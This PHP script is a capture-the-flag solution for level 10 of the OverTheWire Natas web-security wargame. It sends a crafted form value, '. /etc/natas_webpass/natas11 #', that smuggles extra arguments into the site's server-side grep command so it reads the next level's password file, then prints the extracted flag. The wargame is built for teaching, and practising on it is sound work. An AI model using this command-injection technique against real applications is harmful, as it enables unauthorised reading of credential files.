<?php
require_once dirname(__DIR__) . '/bootstrap.php';

$level = 10;
$username = 'natas' . $level;
$password = readFlag($level - 1);

$url = sprintf('http://%s.natas.labs.overthewire.org/', $username);

$response = $client->request('POST', $url, [
    'auth' => [$username, $password],
    'form_params' => [
        'needle' => '. /etc/natas_webpass/natas11 #',
    ]
]);

$body = (string)$response->getBody();
preg_match("/<pre>\n(.*)/", $body, $flag);
echo $flag[1];
